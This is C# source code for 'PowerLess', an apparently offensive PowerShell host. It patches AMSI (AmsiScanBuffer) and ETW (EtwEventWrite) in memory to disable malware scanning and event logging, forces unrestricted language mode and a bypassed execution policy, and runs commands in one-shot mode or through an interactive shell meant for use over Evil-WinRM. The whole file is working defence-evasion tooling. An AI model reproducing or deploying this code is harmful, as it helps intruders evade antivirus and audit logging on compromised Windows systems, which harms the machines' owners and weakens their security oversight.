using System;
using System.Collections;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

namespace PowerLess
{
    internal class Program
    {
        private static object ps;
        private static Type psType;

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static void EtwBypass()
        {
            try
            {
                // 0xC3 is the x86/x64 instruction for 'RET' (Return)
                byte[] patch = { 0xC3 };

                IntPtr hModule = LoadLibrary("ntdll.dll");
                IntPtr lpAddress = GetProcAddress(hModule, "EtwEventWrite");

                uint oldProtect;
                VirtualProtect(lpAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, lpAddress, patch.Length);

                VirtualProtect(lpAddress, (UIntPtr)patch.Length, oldProtect, out _);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] ETW Patch Failed: " + ex.Message);
            }
        }

        public static void AmsiBypass()
        {
            try
            {
                // The byte patch: mov eax, 0x80070005; ret
                byte[] patch = { 0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3 };

                IntPtr hModule = LoadLibrary("amsi.dll");
                IntPtr lpAddress = GetProcAddress(hModule, "AmsiScanBuffer");

                uint oldProtect;
                // PAGE_EXECUTE_READWRITE (0x40)
                VirtualProtect(lpAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, lpAddress, patch.Length);

                VirtualProtect(lpAddress, (UIntPtr)patch.Length, oldProtect, out _);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] AMSI Patch Failed: " + ex.Message);
            }
        }

        static void Main(string[] args)
        {
            try
            {
                // 1. Load Assembly
                string assemblyName = "System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
                Assembly psAssembly = Assembly.Load(assemblyName);

                // 2. Load Types
                var runspaceFactoryType = psAssembly.GetType("System.Management.Automation.Runspaces.RunspaceFactory");
                var issType = psAssembly.GetType("System.Management.Automation.Runspaces.InitialSessionState");
                var psLanguageModeType = psAssembly.GetType("System.Management.Automation.PSLanguageMode");
                var executionPolicyType = psAssembly.GetType("Microsoft.PowerShell.ExecutionPolicy");

                // 3. Create Session State (Static call, no dynamic)
                object iss = issType.GetMethod("CreateDefault", Type.EmptyTypes).Invoke(null, null);

                // FIX: Set properties via explicit Enum values, not ints
                iss.GetType().GetProperty("LanguageMode").SetValue(iss, Enum.Parse(psLanguageModeType, "FullLanguage"), null);
                iss.GetType().GetProperty("ExecutionPolicy").SetValue(iss, Enum.Parse(executionPolicyType, "Bypass"), null);

                // 4. Open Runspace
                var runspace = runspaceFactoryType.GetMethod("CreateRunspace", new Type[] { issType }).Invoke(null, new object[] { iss });
                runspace.GetType().GetMethod("Open", Type.EmptyTypes).Invoke(runspace, null);

                // 6. Execute (Find the parameterless Invoke method manually)
                psType = psAssembly.GetType("System.Management.Automation.PowerShell");
                ps = psType.GetMethod("Create", Type.EmptyTypes).Invoke(null, null);
                ps.GetType().GetProperty("Runspace").SetValue(ps, runspace);

                // Force Standard I/O to be raw streams, not buffered Console streams
                var inputStream = new StreamReader(Console.OpenStandardInput());
                var outputStream = new StreamWriter(Console.OpenStandardOutput());
                outputStream.AutoFlush = true;

                AmsiBypass();
                EtwBypass();

                // 1. COMMAND MODE (The "Evil-WinRM" Way)
                // If you pass arguments, just execute and leave. No loop. No ReadLine.
                if (args.Length > 0)
                {
                    string cmd = string.Join(" ", args);
                    try
                    {
                        // Write directly to standard output
                        Console.WriteLine(Execute(cmd));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Error: " + ex.Message);
                    }
                    return; // EXIT. This prevents the hang!
                }

                // 2. INTERACTIVE MODE (Local Only)
                // Only enter this loop if we are NOT in a pipe/redirected environment
                if (!Console.IsInputRedirected)
                {
                    outputStream.WriteLine(@"
   ________  ________  ________  ________  ________   ______   ________  ________  ________ 
  /        \/        \/  /  /  \/        \/        \//      \ /        \/        \/        \
 /         /         /         /         /         //       //         /        _/        _/
//      __/         /         /        _/        _/        //        _/-        /-        / 
\\_____/  \________/\________/\________/\____/___/\________/\________/\________/\________/ v1.0
                                                    https://github.com/tralsesec/PowerLess
");

                    // 3. REPL Loop
                    while (true)
                    {
                        // 1. Flush the prompt so it actually arrives at the remote console
                        outputStream.Write("PS " + Execute("pwd").Trim() + "> ");
                        outputStream.Flush();

                        // POLLED READ: Do not use ReadLine() yet!
                        // Check if there is data in the stream first
                        while (inputStream.Peek() == -1)
                        {
                            // No input yet? Sleep for 100ms and check again
                            System.Threading.Thread.Sleep(100);
                        }

                        // Now it is safe to read
                        // 2. Handle the Null case (This prevents the infinite loop)
                        string input = inputStream.ReadLine();

                        // If input is null over WinRM, it just means no input was sent YET. 
                        // Don't break, just continue or sleep.
                        if (input == null)
                        {
                            System.Threading.Thread.Sleep(100);
                            continue;
                        }

                        if (string.IsNullOrWhiteSpace(input)) continue;
                        if (input.Trim().ToLower() == "exit") break;
                        if (input.Trim().ToLower() == "clear")
                        {
                            Console.Clear();
                            continue;
                        }

                        try
                        {
                            string result = Execute(input);
                            outputStream.WriteLine(result);
                        }
                        catch (Exception ex)
                        {
                            outputStream.WriteLine("[!] Command Error: " + ex.Message);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Fatal Engine Error: " + ex.ToString());
            }
        }

        public static string Execute(string script)
        {
            var output = new System.Text.StringBuilder();

            try
            {
                // 1. Add the script
                psType.GetMethod("AddScript", new Type[] { typeof(string), typeof(bool) })
                      .Invoke(ps, new object[] { script, true });

                // 2. Invoke
                var invokeMethod = psType.GetMethods().FirstOrDefault(m => m.Name == "Invoke" && m.GetParameters().Length == 0);
                var results = (IEnumerable)invokeMethod.Invoke(ps, null);

                // 3. Collect output
                foreach (var obj in results)
                {
                    if (obj != null) output.AppendLine(obj.ToString());
                }

                // --- NEW: CAPTURE ERRORS ---
                var streams = psType.GetProperty("Streams").GetValue(ps);
                var errorStream = streams.GetType().GetProperty("Error").GetValue(streams);
                var errorReader = errorStream.GetType().GetMethod("ReadAll", Type.EmptyTypes).Invoke(errorStream, null);

                foreach (var error in (IEnumerable)errorReader)
                {
                    output.AppendLine(error.ToString());
                }

                // 4. Clear pipeline AND streams for next command
                var commands = psType.GetProperty("Commands").GetValue(ps);
                commands.GetType().GetMethod("Clear").Invoke(commands, null);

                // Also clear the error stream so you don't see the same error twice!
                errorStream.GetType().GetMethod("Clear", Type.EmptyTypes).Invoke(errorStream, null);
            }
            catch (TargetInvocationException tie)
            {
                throw tie.InnerException ?? tie;
            }

            return output.ToString();
        }
    }
}